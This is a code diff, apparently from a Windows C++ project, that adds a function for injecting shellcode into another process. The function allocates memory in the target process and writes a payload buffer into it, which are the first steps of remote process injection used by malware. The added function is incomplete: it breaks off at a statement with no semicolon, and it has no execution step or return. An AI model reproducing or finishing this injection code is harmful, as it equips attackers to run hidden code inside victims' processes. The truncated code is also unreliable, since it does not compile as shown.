@@ -46,3 +46,25 @@ BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hP
 	CloseHandle(hSnapshot);
 	return found;
 }
+
+BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
+	PVOID pShellcodeAddress = NULL;
+	SIZE_T sNumberOfBytesWritten = 0;
+	DWORD dwOldProtection = NULL;
+
+	//allocate memory in the remote process of size sSizeOfShellcode
+	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (!pShellcodeAddress) {
+		std::wcerr << L"[!] VirtualAllocEx Failed with process : " << GetLastError() << std::endl;
+		return FALSE;
+	}
+	std::wcout << L"ALlocated Memory at : 0x" << pShellcodeAddress << std::endl;
+
+	//write the shellcode in the allocated memory
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+		std::wcerr << L"[!] WriteProcessMemory Failed with error : " << GetLastError() << std::endl;
+		return FALSE;
+	}
+	std::wcout << L""
+}
